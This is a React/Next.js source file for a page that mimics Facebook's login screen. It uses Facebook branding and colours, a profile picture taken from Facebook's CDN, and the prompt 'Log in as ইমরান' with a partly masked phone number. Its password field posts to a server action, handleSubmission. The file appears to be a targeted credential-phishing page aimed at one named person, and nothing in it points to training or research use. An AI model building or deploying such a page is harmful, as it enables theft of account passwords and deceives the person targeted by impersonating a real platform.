"use client";
import { handleSubmission } from "@/app/actions/submit";
import Image from "next/image";

export default function LoginForm() {
  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-gray-100 py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md text-center mb-6">
        <h1 className="text-4xl font-bold text-[#1877f2]">facebook</h1>
      </div>

      <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
        <div className="bg-white py-8 px-4 shadow-lg sm:rounded-lg sm:px-10 text-center">
          <div className="mb-6">
            <div className="mx-auto h-24 w-24 relative">
              <Image
                className="rounded-full border-4 border-white shadow-sm"
                src="https://scontent.fzyl4-1.fna.fbcdn.net/v/t39.30808-6/515583321_3643352759307724_9025623918687065744_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeHJRWMrRAlURqRHmoR1CGtsynrWpM8KKu_Ketakzwoq7zBPEFv0Jkg5Q7l2wqOn0LJbb8JtXiM6dIjquBa6NHZZ&_nc_ohc=_PcvDXYgb9kQ7kNvwFb8YC5&_nc_oc=AdnInB60aH2n0I3BRnj9coBgVKtNs3PZuBfw9kyncZ37SJQBIwrZBq045QE6eUcDUNA&_nc_zt=23&_nc_ht=scontent.fzyl4-1.fna&_nc_gid=i7KQEA_qPrpVwKdtuoLGHg&oh=00_AfsSZiwX8pniMROvr9dAQ4SMVmcw6uZh6tWByAZtWlvb5A&oe=6989198F" // Replace with your actual image path
                alt="Profile"
                layout="fill"
                objectFit="cover"
              />
            </div>
            <p className="mt-4 text-xl font-medium text-gray-900">
              Log in as ইমরান
            </p>
            <p className="mt-1 text-sm text-gray-600">
              <span className="blur-[2px]">example</span>01********206{" "}
              <a href="#" className="text-[#1877f2] hover:underline">
                Not you?
              </a>
            </p>
          </div>

          <form action={handleSubmission} className="space-y-6">
            <div>
              <input
                name="password"
                type="password"
                required
                className="block w-full rounded-md border-0 py-3.5 px-4 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-500 focus:ring-2 focus:ring-inset focus:ring-[#1877f2] sm:text-lg"
                placeholder="Password"
              />
            </div>

            <div className="flex flex-col space-y-4">
              <button
                type="submit"
                className="flex w-full justify-center rounded-md bg-[#1877f2] px-3 py-3 text-lg font-bold text-white hover:bg-[#166fe5] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#1877f2]"
              >
                Log In
              </button>
              <button
                type="button"
                className="flex w-full justify-center rounded-md bg-[#e4e6eb] px-3 py-3 text-lg font-bold text-[#4b4f56] hover:bg-[#d8dadf]"
              >
                Try another way
              </button>
            </div>
          </form>

          <div className="mt-6">
            <a href="#" className="text-sm text-[#1877f2] hover:underline">
              Forgot account?
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}